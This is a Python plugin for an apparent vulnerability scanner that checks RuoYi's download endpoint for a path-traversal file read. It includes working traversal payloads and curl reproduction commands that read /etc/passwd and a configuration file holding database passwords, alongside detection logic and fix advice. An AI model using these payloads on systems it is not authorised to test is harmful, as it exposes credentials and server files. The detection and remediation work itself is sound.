# 任意文件读取：若依 /common/download/resource 路径穿越读取服务器文件
# 漏洞原因：若依旧版 /common/download/resource?resource= 接口未对 resource 参数做白名单校验，
#   攻击者构造 ../ 路径穿越可读取任意文件（如 /etc/passwd、/proc/self/environ）。
# 本插件仅做存在性验证：读取 /etc/passwd，检测响应是否含真实 passwd 文件特征。
# D4 改造（2026-07-18）：删除签名 marker，改真实 /etc/passwd 特征判定，兼容签名靶场与真实若依。
import re

from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.reporter import emit
from plugins.base import PluginBase

# /etc/passwd 行格式：name:<密码字段>:uid:gid:...（密码字段见 _is_passwd_file 注释）。
# 模块级预编译：判定函数每次 verify 最多调用两次，避免重复编译
_PASSWD_RE = re.compile(r"^([a-zA-Z_][a-zA-Z0-9_-]*):[^:\n]*:(\d+):(\d+):", re.MULTILINE)


def _is_passwd_file(text):
    """判定响应是否为真实 /etc/passwd 文件内容

    真实 /etc/passwd 文件特征：
    - 每行格式：username:x:uid:gid:gecos:home:shell
    - 含 root 账户行：root:x:0:0:root:/root:/bin/bash（或 /bin/sh）
    - 含 daemon/bin/sys 等系统账户行
    - uid/gid 为数字

    Returns:
        (hit: bool, evidence: str)
    """
    if not text:
        return False, "空响应"

    # 提取所有形如 name:<password field>:uid:gid:... 的行。
    # 密码字段不限定为 x：锁定账户为 *、无密码账户为空、部分发行版为密码哈希，
    # 只匹配 :x: 会让这些目标上的真实漏洞被漏判（false negative）
    matches = _PASSWD_RE.findall(text)
    if not matches:
        return False, "响应不含 passwd 格式行"

    # 至少匹配到 2 个账户行（真实 /etc/passwd 通常含 root + 多个系统账户）
    if len(matches) < 2:
        return False, f"仅匹配到 {len(matches)} 个 passwd 行（需 ≥2）"

    # 强特征：含 root 账户（uid=0）
    has_root = any(name == "root" and uid == "0" for name, uid, gid in matches)
    # 次强特征：含常见系统账户（daemon/bin/sys/nobody/mail 等）。
    # 不含 root：否则 has_system 恒被 has_root 蕴含，「或」条件里 root 分支形同虚设
    system_accounts = {"daemon", "bin", "sys", "nobody", "mail", "ftp", "www-data"}
    has_system = any(name in system_accounts for name, uid, gid in matches)

    if has_root or has_system:
        # 提取前 3 个账户名作为证据
        names = [m[0] for m in matches[:3]]
        return True, f"读取到 /etc/passwd：{names}"
    return False, "passwd 行无 root/系统账户"


class RuoyiFileReadPathPlugin(PluginBase):
    name = "任意文件读取（路径穿越）"
    cve = "CNVD-2021-01931"
    severity = "high"
    category = "vuln"
    description = (
        "若依 /common/download/resource?resource= 接口未对 resource 参数做白名单校验，"
        "攻击者构造 ../ 路径穿越可读取任意文件"
    )
    fix = "resource 参数白名单校验（仅允许 /profile/upload/ 下的文件）；禁止 .. 路径穿越；升级到若依 4.7+ 已修复该漏洞"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.7.0+（该版本已修复路径穿越）\n"
        "【代码修复】CommonController.downloadResource() 添加路径校验：\n"
        '  if (!resource.startsWith("/profile/upload/")) { throw new ServiceException("非法 resource 路径"); }\n'
        '  if (resource.contains("..")) { throw new ServiceException("禁止路径穿越"); }\n'
        "【权限加固】为 /common/download/resource 添加 @PreAuthorize(\"@ss.hasPermi('monitor:download')\")\n"
        '【WAF 规则】拦截 resource 参数含 ".." 或不以 "/profile/upload/" 开头的请求\n'
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 读取 /etc/passwd（Linux）：\n"
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../etc/passwd"\n'
        "\n"
        "# 读取 application.yml（若依配置文件，含数据库密码）：\n"
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../app/application.yml"\n'
        "\n"
        '# 预期响应：响应体含 "root:x:0:0:" 格式行（/etc/passwd 特征）或 "spring.datasource" 字样'
    )
    # D2：路径穿越在 4.7.0 已修复
    affected_versions = ">=4.0,<4.7"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "file_read"
    supports_waf_bypass = True

    def verify(self, target, session):
        """用多级路径穿越 payload 读取 /etc/passwd，按真实文件特征判定漏洞

        与 file_read 插件的差异：载荷同时尝试深层 /profile/../ 与 3 层相对穿越，
        判定基于 /etc/passwd 标准行格式（username:<密码字段>:uid:gid）而非简单 root 子串
        @param target: 目标主机，用于拼接下载接口地址
        @param session: 复用的 HTTP 会话对象
        @return: ScanResult——200 且响应含 ≥2 个 passwd 账户行（root/系统账户）为 CONFIRMED；
                 有 200 但无特征或 400/403/404 为 SAFE；重定向/其他状态与网络异常为 UNKNOWN
        """
        # 穿越深度候选：先试与 reproduce/兄弟插件一致的深层 /profile/ 载荷（部署层级更深也能到 /），
        # 再回退 3 层相对穿越（部分部署对 /profile/ 前缀有额外处理）
        resources = [
            "/profile/../../../../../../../etc/passwd",
            "../../../etc/passwd",
        ]
        requests_seen = []  # (url, code) 已拿到响应的请求
        last_200_text = None  # 最近一次 200 响应正文（用于无特征时输出判据原因）
        for resource in resources:
            url = join_url(target, f"/common/download/resource?resource={resource}")
            try:
                resp = session.get(url)
            except Exception:
                # 单个深度请求失败不立即判 UNKNOWN：继续尝试下一深度
                requests_seen.append((url, 0))
                continue

            text = resp.text or ""
            code = getattr(resp, "status_code", 0)
            requests_seen.append((url, code))

            # 200 + 真实 /etc/passwd 特征 → CONFIRMED
            if code == 200:
                last_200_text = text
                hit, evidence = _is_passwd_file(text)
                if hit:
                    emit(ok("存在任意文件读取漏洞（路径穿越）"))
                    return ScanResult(
                        kind="vuln",
                        name=self.name,
                        severity=self.severity,
                        status=STATUS_CONFIRMED,
                        url=url,
                        evidence=evidence,
                        fix=self.fix,
                        extra={
                            "vuln_type": "arbitrary_file_read",
                            "payload_class": "traversal_etc_passwd",
                            "plugin_name": "file_read_path",
                        },
                    )

        last_url = requests_seen[-1][0] if requests_seen else join_url(target, "/common/download/resource")
        codes = [code for _, code in requests_seen]

        # 全部请求网络异常 → UNKNOWN（测不到 ≠ 安全）
        if not any(code for code in codes):
            emit(no("任意文件读取（网络异常）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=last_url,
                evidence="所有穿越载荷请求均网络异常，无法判定",
            )

        # 有 200 响应但全部无 passwd 特征 → SAFE（该深度读不到目标文件）
        if 200 in codes:
            # 复跑判据函数仅为取用其 evidence 文本作安全原因，避免另写一套判定逻辑
            _, reason = _is_passwd_file(last_200_text or "")
            reason = f"200 但{reason}"
        # 全部为已识别的拦截/不存在状态 → SAFE
        elif all(code in (400, 403, 404) for code in codes if code):
            reason = f"HTTP {codes[-1]} 路径被拦截或端点不存在"
        else:
            # 重定向/5xx 等：响应可能被网关或登录跳转改写，passwd 检查天然失效，
            # 不能据此判 SAFE（历史缺陷：301/302 与未知状态全部落入 SAFE）
            emit(no(f"任意文件读取（HTTP {codes[-1]} 非判定状态）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=last_url,
                evidence=f"HTTP {codes[-1]} 非 200/400/403/404，响应可能被网关改写，无法判定",
            )

        emit(no(f"不存在任意文件读取漏洞（{reason}）"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=last_url, evidence=reason)
